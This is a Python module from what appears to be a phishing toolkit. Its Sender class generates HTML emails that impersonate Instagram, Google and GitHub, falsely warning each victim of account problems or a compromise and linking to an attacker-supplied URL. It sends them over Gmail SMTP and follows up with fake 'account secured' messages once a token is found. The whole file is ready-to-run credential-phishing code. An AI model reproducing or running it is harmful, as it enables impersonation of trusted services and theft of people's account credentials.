import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from Core.Support import Font
from time import sleep
import os


class Sender:
    
    @staticmethod
    def instagram_template(email, password, vict_email, username, links):
        print(Font.Color.GREEN + "[+]" + Font.Color.WHITE + "GENERATING TEMPLATE....")
        f = open("Phishing/Template/template.html", "w+")
        f.write("""
        <html>
        <body>
        <div style="margin:0;padding:0" dir="ltr" bgcolor="#ffffff">
        <table border="0" cellspacing="0" cellpadding="0" align="center" id="m_-6771075845464280513email_table" style="border-collapse:collapse">
        <tbody>
        <tr>
        <td id="m_-6771075845464280513email_content" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;background:#ffffff">
        <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
        <tbody>
        <tr>
        <td height="20" style="line-height:20px" colspan="3">&nbsp;</td>
        </tr>
            <tr>
            <td height="1" colspan="3" style="line-height:1px"></td>
            </tr>
            <tr>
            <td>
            <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border:solid 1px white;margin:0 auto 5px auto;padding:3px 0;text-align:center;width:430px">
            <tbody>
            <tr>
            <td width="15px" style="width:15px">
            </td>
            <td style="line-height:0px;width:400px;padding:0 0 15px 0">
            <table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
            <tbody>
            <tr>
            <td style="width:100%;text-align:left;height:33px">
            <img height="33" src="https://ci4.googleusercontent.com/proxy/H-WMBt20rSRWwIK0YLwC8Uyi1mnXWEEEiUT0twBA78N4_Rbri9VuqAL_Azd6xVjLkSiTQ6r1RjyDJ2Hx1O_3UqLo4H_LxG1o8LHL4yDfZw=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/QTa-gpOyYBa.png" style="border:0" class="CToWUd">
            </td>
            </tr>
            </tbody>
            </table>
            </td>
            <td width="15px" style="width:15px">
            </td>
            </tr>
            <tr>
            <td width="15px" style="width:15px">
            </td>
            <td style="border-top:solid 1px #dbdbdb">
            </td>
            <td width="15px" style="width:15px">
            </td>
            </tr>
            </tbody>
            </table>
            </td>
            </tr>
            <tr>
            <td>
                <table border="0" width="430" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto">
                <tbody>
                <tr>
                <td>
                <table border="0" width="430px" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto;width:430px">
                    <tbody>
                    <tr>
                    <td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td>
                    </tr>
                    <tr>
                    <td>
                    <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
                    <tbody>
                    <tr>
                    <td>
                    <table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
                    <tbody>
                    <tr>
                    <td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td>
                    <td>
                        <table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
                        <tbody>
                        <tr>
                        <td>
                        </td>
                        </tr>
                        <tr>
                        <td>
                        <p style="margin:10px 0 10px 0;color:#565a5c;font-size:18px">Hi """ + username + """</p><p style="margin:10px 0 10px 0;color:#565a5c;font-size:18px">We noticed some problems with your account.</p>
                        </td></tr>
                        <tr></tr>
                        <tr>
                        <td height="10" style="line-height:10px" colspan="1">&nbsp;</td></tr>
                        <tr>
                        <td>
                    <table border="0" width="390" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
                        <tbody>
                        <tr>
                            <tr>
                            <td>
                            <p style="margin:1px 0 10px 0;color:#565a5c;font-size:18px">If you ignore this message, we will remove your account immidiately for the safety of our service.
                        </p></td></tr></tbody></table></td><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td></tr>
                            </tbody>
                            <td style="border-collapse:collapse;border-radius:3px;text-align:center;display:block;border:solid 1px #009fdf;padding:10px 16px 14px 16px;margin:0 2px 0 auto;min-width:80px;background-color:#47a2ea"><a href=""" + '' + links + ''""" style="color:#3b5998;text-decoration:none;display:block" target="_blank" data-saferedirecturl=""><center><font size="3"><span style="font-family:Helvetica Neue,Helvetica,Roboto,Arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#fdfdfd;font-size:16px;line-height:16px">Check&nbsp;Activity
                        </span></font></center></a></td></tr></tbody></table></a></td></tr>
                            <tr><td height="10" style="line-height:10px" colspan="1">&nbsp;
                            </td>
                            </tr>
                            </table>
                            </td>
                            </tr>
                            </tbody>
                            </table>
                            </td>
                            </tr>
                            </tbody>
                            </table>
                            </td>
                            </tr>
                            </tbody>
                            </table>
                            </td></tr><tr><td>
                            <table border="0" width="430px" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto;width:430px"><tbody><tr><td height="5" style="line-height:5px" colspan="3">&nbsp;</td></tr><tr><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td><div style="padding-top:10px"><img src="https://ci4.googleusercontent.com/proxy/1jVmGWy9tCnCqBWLSinJ6Z8m-mANhlu-0HJJpn3x1Rf1YzMg3CCnm8YzpKQh29yaES9XHM9NySfBVkv1HDbly59FbBb3QtlImd0tFZxpVA=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yP/r/ARZq-vP6uSX.png" height="30" width="77" alt="" class="CToWUd"><br>
                            </div>
                            <div style="height:10px">
                            </div>
                            <div style="color:#abadae;font-size:11px;margin:0 auto 5px auto">© Instagram. Facebook Inc., 1601 Willow Road, Menlo Park, CA 94025
                            <br>
                            </div>
                            <div style="color:#abadae;font-size:11px;margin:0 auto 5px auto">This message was sent to you <a style="color:#abadae;text-decoration:underline">""" + vict_email + """</a> and intended for """ + username + """. Not your account? <a href="https://instagram.com/accounts/remove/report_wrong_email/2s61r5s/5ek-693483ceb4d80b065e6015805237eeb6/w5nY3j90/bHVjYWdhcm9mYWxvMDJAZ21haWwuY29t/" style="color:#abadae;text-decoration:underline" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://instagram.com/accounts/remove/report_wrong_email/2s61r5s/5ek-693483ceb4d80b065e6015805237eeb6/w5nY3j90/bHVjYWdhcm9mYWxvMDJAZ21haWwuY29t/&amp;source=gmail&amp;ust=1612870216348000&amp;usg=AFQjCNGZI-bOmXLy7H1qDa0SbyZStfxslg">Remove your email</a> from this account.
                            <br>
                            </div>
                            </td>
                            <td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;
                            </td></tr></tbody></table></td></tr>
                            <tr>
                            <td height="20" style="line-height:20px" colspan="3">&nbsp;
                            </td></tr>
                            </tbody></table>
                            <span><img src="https://ci6.googleusercontent.com/proxy/dgydYneR-yCzdfy07nuLAaMs8WnN0VZ1eV-D9sNxk0-0wcuXlqohYxappUKrQ09YKBQTrsU8pgd0y5uogt3Ek8--FchRo1YqHtDhMDHOmayLCwlSakm2xj9aIE0dRyTkvny8_b66Ff5O1oCjiCkfbf9P7BNU=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=5a03a2edede13G24bc2e43fd55c0G5a03a7874e0e7G248" style="border:0;width:1px;height:1px" class="CToWUd"></span></td></tr></tbody></table></div>
                            </body>
                            </html>
                                """)
        f.close()
        html = open("Phishing/Template/template.html")
        message = MIMEMultipart()
        message = MIMEText(html.read(), "html")
        message['From'] = "Instagram:"
        message['To'] = vict_email
        message['Subject'] = "Problem with your Instagram account"
        # SERVER DECLARATION #
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        text = message.as_string()
        try:
            server.sendmail(email, vict_email, text)
            print(Font.Color.WHITE + "\n[+]" + Font.Color.YELLOW + "EMAIL SENT" + Font.Color.WHITE + "[+]")
        except Exception as e:
            print(e)
        os.remove("Phishing/Template/template.html")

    @staticmethod
    def instagram_secured(email, password, vict_email, username):
        print(Font.Color.GREEN + "[+]" + Font.Color.WHITE + "TOKEN FOUND")
        print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "GENERATING SECURETED TEMPLATE....")
        sleep(2)
        f = open("Phishing/Template/confirmed.html", "w+")
        f.write("""
        <html>
        <body>
        <div style="margin:0;padding:0" dir="ltr" bgcolor="#ffffff">
        <table border="0" cellspacing="0" cellpadding="0" align="center" id="m_-6771075845464280513email_table" style="border-collapse:collapse">
        <tbody>
        <tr>
        <td id="m_-6771075845464280513email_content" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;background:#ffffff">
        <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
        <tbody>
        <tr>
        <td height="20" style="line-height:20px" colspan="3">&nbsp;</td>
        </tr>
        <tr>
        <td height="1" colspan="3" style="line-height:1px"></td>
        </tr>
        <tr>
        <td>
        <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border:solid 1px white;margin:0 auto 5px auto;padding:3px 0;text-align:center;width:430px">
        <tbody>
        <tr>
        <td width="15px" style="width:15px">
        </td>
        <td style="line-height:0px;width:400px;padding:0 0 15px 0">
        <table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
        <tbody>
        <tr>
        <td style="width:100%;text-align:left;height:33px">
        <img height="33" src="https://ci4.googleusercontent.com/proxy/H-WMBt20rSRWwIK0YLwC8Uyi1mnXWEEEiUT0twBA78N4_Rbri9VuqAL_Azd6xVjLkSiTQ6r1RjyDJ2Hx1O_3UqLo4H_LxG1o8LHL4yDfZw=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/QTa-gpOyYBa.png" style="border:0" class="CToWUd">
        </td>
        </tr>
        </tbody>
        </table>
        </td>
        <td width="15px" style="width:15px">
        </td>
        </tr>
        <tr>
        <td width="15px" style="width:15px">
        </td>
        <td style="border-top:solid 1px #dbdbdb">
        </td>
        <td width="15px" style="width:15px">
        </td>
        </tr>
        </tbody>
        </table>
        </td>
        </tr>
        <tr>
        <td>
            <table border="0" width="430" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto">
            <tbody>
            <tr>
            <td>
            <table border="0" width="430px" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto;width:430px">
            <tbody>
            <tr>
            <td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td>
            </tr>
            <tr>
            <td>
            <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
            <tbody>
            <tr>
            <td>
            <table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
            <tbody>
            <tr>
            <td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td>
            <td>
                <table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
                <tbody>
                <tr>
                <td>
                </td>
                </tr>
                <tr>
                <td>
                <p style="margin:10px 0 10px 0;color:#565a5c;font-size:18px;text-align: center;">Thank you for have secured your account.</p>
                </td></tr>
                <tr></tr>
                <tr>
                <td height="10" style="line-height:10px" colspan="1">&nbsp;</td></tr>
                <tr>
                <td>
            <table border="0" width="390" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
                <tbody>    
                </table>
                    </td>
                    </tr>
                    </tbody>
                    </table>
                    </td>
                    </tr>
                    </tbody>
                    </table>
                    </td>
                    </tr>
                    </tbody>
                    </table>
                    </td></tr><tr><td>
                        <table border="0" width="430px" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto;width:430px"><tbody><tr><td height="5" style="line-height:5px" colspan="3">&nbsp;</td></tr><tr><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td><div style="padding-top:10px"><img src="https://ci4.googleusercontent.com/proxy/1jVmGWy9tCnCqBWLSinJ6Z8m-mANhlu-0HJJpn3x1Rf1YzMg3CCnm8YzpKQh29yaES9XHM9NySfBVkv1HDbly59FbBb3QtlImd0tFZxpVA=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yP/r/ARZq-vP6uSX.png" height="30" width="77" alt="" class="CToWUd"><br>
                        </div>
                        <div style="height:10px">
                        </div>
                        <div style="color:#abadae;font-size:11px;margin:0 auto 5px auto">© Instagram. Facebook Inc., 1601 Willow Road, Menlo Park, CA 94025
                        <br>
                        </div>
                        <div style="color:#abadae;font-size:11px;margin:0 auto 5px auto">This message was sent to """ + vict_email + """ <a style="color:#abadae;text-decoration:underline"><!--HERE COMES THE VICTIM EMAIL--></a> and intended for """ + username + """. Not your account? <a href="https://instagram.com/accounts/remove/report_wrong_email/2s61r5s/5ek-693483ceb4d80b065e6015805237eeb6/w5nY3j90/bHVjYWdhcm9mYWxvMDJAZ21haWwuY29t/" style="color:#abadae;text-decoration:underline" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://instagram.com/accounts/remove/report_wrong_email/2s61r5s/5ek-693483ceb4d80b065e6015805237eeb6/w5nY3j90/bHVjYWdhcm9mYWxvMDJAZ21haWwuY29t/&amp;source=gmail&amp;ust=1612870216348000&amp;usg=AFQjCNGZI-bOmXLy7H1qDa0SbyZStfxslg">Remove your email</a> from this account.
                        <br>
                        </div>
                        </td>
                        <td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;
                        </td></tr></tbody></table></td></tr>
                        <tr>
                        <td height="20" style="line-height:20px" colspan="3">&nbsp;
                        </td></tr>
                        </tbody></table>
                        <span><img src="https://ci6.googleusercontent.com/proxy/dgydYneR-yCzdfy07nuLAaMs8WnN0VZ1eV-D9sNxk0-0wcuXlqohYxappUKrQ09YKBQTrsU8pgd0y5uogt3Ek8--FchRo1YqHtDhMDHOmayLCwlSakm2xj9aIE0dRyTkvny8_b66Ff5O1oCjiCkfbf9P7BNU=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=5a03a2edede13G24bc2e43fd55c0G5a03a7874e0e7G248" style="border:0;width:1px;height:1px" class="CToWUd"></span></td></tr></tbody></table></div>
                        </body>
                        </html>

        """)
        f.close()
        html = open("Phishing/Template/confirmed.html")
        message = MIMEMultipart()
        message = MIMEText(html.read(), "html")
        message['From'] = "Instagram:"
        message['To'] = vict_email
        message['Subject'] = "Instagram Account secured"
        # SERVER DECLARATION #
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        text = message.as_string()
        try:
            server.sendmail(email, vict_email, text)
            print(Font.Color.WHITE + "\n[+]" + Font.Color.YELLOW + "EMAIL SENT" + Font.Color.WHITE + "[+]")
        except Exception as e:
            print(e)
        os.remove("Phishing/Template/confirmed.html")

    @staticmethod
    def google_template(email, password, vict_email, links):
        print(Font.Color.GREEN + "[+]" + Font.Color.WHITE + "GENERATING TEMPLATE....")
        f = open("Phishing/Template/template.html", "w")
        f.write("""
                <html>
                <body>
                <div style="border-style:solid;border-width:thin;border-color:#dadce0;border-radius:8px;padding:40px 20px" align="center">
    <img src="https://ci5.googleusercontent.com/proxy/T_zJ7UbaC9x27OP4-ZCPfDipqYLSGum30AlaxEycVclfvxO8Cze0sZ0kCrXlx6a-MgvW2tswbIyiNVfczjDuGh9okorzC5SUJDfwkHr6-3j1KUu94HuAw5uxM_jaElQef3Sub84=s0-d-e1-ft#https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" aria-hidden="true" style="margin-bottom:16px" alt="Google" class="CToWUd" width="74" height="24">
    <div style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;border-bottom:thin solid #dadce0;color:rgba(0,0,0,0.87);line-height:32px;padding-bottom:24px;text-align:center;word-break:break-word">
    <div style="font-size:24px">We have detected a problem with your account &nbsp;
    </div>
    <table style="margin-top:8px" align="center">
    <tbody>
    <tr style="line-height:normal">
    <td style="padding-right:8px" align="right">
    </td>
    <td>
    </td></tr>
    <img align ="center"style="width:40px;height:40px;border-radius:50%" src="https://cdn1.iconfinder.com/data/icons/color-bold-style/21/08-512.png" alt="" class="CToWUd" width="40" height="40">
    </tbody></table>
    </div>
    <div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;font-size:14px;color:rgba(0,0,0,0.87);line-height:20px;padding-top:20px;text-align:center">Hi <a style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.87);font-size:14px;line-height:20px;margin-top:10px;">""" + vict_email + """</a> looks like your account has been compromised please verify your credentials
    <div style="padding-top:32px;text-align:center">
    <a href=""" + '' + links + ''""" style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;line-height:16px;color:#ffffff;font-weight:400;text-decoration:none;font-size:14px;display:inline-block;padding:10px 24px;background-color:#4184f3;border-radius:5px;min-width:90px" target="_blank" data-saferedirecturl="">Check the activity</a></div></div>
    <div style="padding-top:20px;font-size:12px;line-height:16px;color:#5f6368;letter-spacing:0.3px;text-align:center">you can also check your activity here:
    <br>
    <a style="color:rgba(0,0,0,0.87);text-decoration:inherit">https://myaccount.google.com/n<wbr>otifications</a></div></div>
    <div style="text-align:center">
    <div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center">
    <div style="direction:ltr">© 2021 Google Ireland Ltd., <a class="m_-4473426257341250174afal" style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center">Gordon House, Barrow Street, Dublin 4, Ireland</a></div></div></div></td><td width="8" style="width:8px"></td></tr></tbody></table></td></tr><tr height="32" style="height:32px"><td></td></tr></tbody></table></div></div>
             </body>
             </html>
                """)
        f.close()

        html = open("Phishing/Template/template.html")
        message = MIMEMultipart()
        message = MIMEText(html.read(), "html")
        message['From'] = "Google:"
        message['To'] = vict_email
        message['Subject'] = "Problem with your Google account"
        # SERVER DECLARATION #
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        text = message.as_string()
        try:
            server.sendmail(email, vict_email, text)
            print(Font.Color.WHITE + "\n[+]" + Font.Color.YELLOW + "EMAIL SENT" + Font.Color.WHITE + "[+]")
        except Exception as e:
            print(e)
        os.remove("Phishing/Template/template.html")

    @staticmethod
    def google_secured(email, password, vict_email):
        print(Font.Color.GREEN + "[+]" + Font.Color.WHITE + "TOKEN FOUND")
        print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "GENERATING SECURETED TEMPLATE....")
        sleep(2)
        f = open("Phishing/Template/confirmed.html", "w+")
        f.write("""
        <html>
        <body>
        <div style="border-style:solid;border-width:thin;border-color:#dadce0;border-radius:8px;padding:40px 20px" align="center">
    <img src="https://ci5.googleusercontent.com/proxy/T_zJ7UbaC9x27OP4-ZCPfDipqYLSGum30AlaxEycVclfvxO8Cze0sZ0kCrXlx6a-MgvW2tswbIyiNVfczjDuGh9okorzC5SUJDfwkHr6-3j1KUu94HuAw5uxM_jaElQef3Sub84=s0-d-e1-ft#https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" aria-hidden="true" style="margin-bottom:16px" alt="Google" class="CToWUd" width="74" height="24">
    <div style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;border-bottom:thin solid #dadce0;color:rgba(0,0,0,0.87);line-height:32px;padding-bottom:24px;text-align:center;word-break:break-word">
    <div style="font-size:24px">Account secured &nbsp;
    </div>
    <table style="margin-top:8px" align="center">
    <tbody>
    <tr style="line-height:normal">
    <td style="padding-right:8px" align="right">
        <a style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.87);font-size:14px;line-height:20px;margin-top:10px;">""" + vict_email + """</a>
    </td>
    <td>
    </td></tr>
    </tbody></table>
    </div>
    <div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;font-size:14px;color:rgba(0,0,0,0.87);line-height:20px;padding-top:20px;text-align:center">Thank you for have secured your account
    <div style="padding-top:32px;text-align:center">
    <div style="padding-top:20px;font-size:12px;line-height:16px;color:#5f6368;letter-spacing:0.3px;text-align:center">you can also check your activity here:
    <br>
    <a style="color:rgba(0,0,0,0.87);text-decoration:inherit">https://myaccount.google.com/n<wbr>otifications</a></div></div>
    <div style="text-align:center">
    <div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center">
    <div style="direction:ltr">© 2021 Google Ireland Ltd., <a class="m_-4473426257341250174afal" style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center">Gordon House, Barrow Street, Dublin 4, Ireland</a></div></div></div></td><td width="8" style="width:8px"></td></tr></tbody></table></td></tr><tr height="32" style="height:32px"><td></td></tr></tbody></table></div></div>
    </body>
    </html>
        """)
        f.close()
        html = open("Phishing/Template/confirmed.html")
        message = MIMEMultipart()
        message = MIMEText(html.read(), "html")
        message['From'] = "Google:"
        message['To'] = vict_email
        message['Subject'] = "Google Account secured"
        # SERVER DECLARATION #
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        text = message.as_string()
        try:
            server.sendmail(email, vict_email, text)
            print(Font.Color.WHITE + "\n[+]" + Font.Color.YELLOW + "EMAIL SENT" + Font.Color.WHITE + "[+]")
        except Exception as e:
            print(e)
        os.remove("Phishing/Template/confirmed.html")

    @staticmethod
    def github_template(email, password, vict_email, username, links):
        print(Font.Color.GREEN + "[+]" + Font.Color.WHITE + "GENERATING TEMPLATE....")
        f = open("Phishing/Template/template.html", "w")
        f.write("""
                    <html>
                <body>
                <div id=":29g" class="a3s aiL ">Hey """ + username + """<br>
                    <br>
                    Someone has tried to access on your account your data may be at risk
                    <br>
                    <br>
                    Log in to confirm that is you and check the activity <a href= """ + "" + links + "" """ target="_blank" >Check the activity</a><br>
                    <br>
                    If you run into problems, please contact support by visiting <a href="" style="color:#0000ff" rel="noreferrer" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://github.com/contact&amp;source=gmail&amp;ust=1619524905264000&amp;usg=AFQjCNH_U_nM6w3FRIK6U8wqjC8y_Rmk7g">https://<span class="il">github</span>.com/contact</a><br>
                    <br>
                    Thanks,<br>
                    The <span class="il">GitHub</span> Team<div class="yj6qo"></div><div class="adL"><br>
                    </div></div>
                </body>
                </html>
                    """)
        f.close()
        html = open("Phishing/Template/template.html")
        message = MIMEMultipart()
        message = MIMEText(html.read(), "html")
        message['From'] = "GitHub:"
        message['To'] = vict_email
        message['Subject'] = "Problem with your GitHub account"
        # SERVER DECLARATION #
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        text = message.as_string()
        try:
            server.sendmail(email, vict_email, text)
            print(Font.Color.WHITE + "\n[+]" + Font.Color.YELLOW + "EMAIL SENT" + Font.Color.WHITE + "[+]")
        except Exception as e:
            print(e)
        os.remove("Phishing/Template/template.html")

    @staticmethod
    def github_secured(email, password, vict_email, username):
        print(Font.Color.GREEN + "[+]" + Font.Color.WHITE + "TOKEN FOUND")
        print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "GENERATING SECURETED TEMPLATE....")
        sleep(2)
        f = open("Phishing/Template/confirmed.html", "w+")
        f.write("""
            <html>
            <body>
                <div id=":29g" class="a3s aiL ">Hey """ + username + """<br>
                <br>
                   Thank you for have secured your account
                <br>
                </div>
                </body>
                </html>
                    """)

        f.close()
        html = open("Phishing/Template/confirmed.html")
        message = MIMEMultipart()
        message = MIMEText(html.read(), "html")
        message['From'] = "GitHub:"
        message['To'] = vict_email
        message['Subject'] = "GitHub Account secured"
        # SERVER DECLARATION #
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        text = message.as_string()
        try:
            server.sendmail(email, vict_email, text)
            print(Font.Color.WHITE + "\n[+]" + Font.Color.YELLOW + "EMAIL SENT" + Font.Color.WHITE + "[+]")
        except Exception as e:
            print(e)
            os.remove("Phishing/Template/confirmed.html")
    
    @staticmethod
    def Coming_soon():
        print(Font.Color.RED + "\n[!]" + Font.Color.WHITE + "SORRY BUT THE EMAIL TEMPLATE IS NOT AVAIABLE YET")
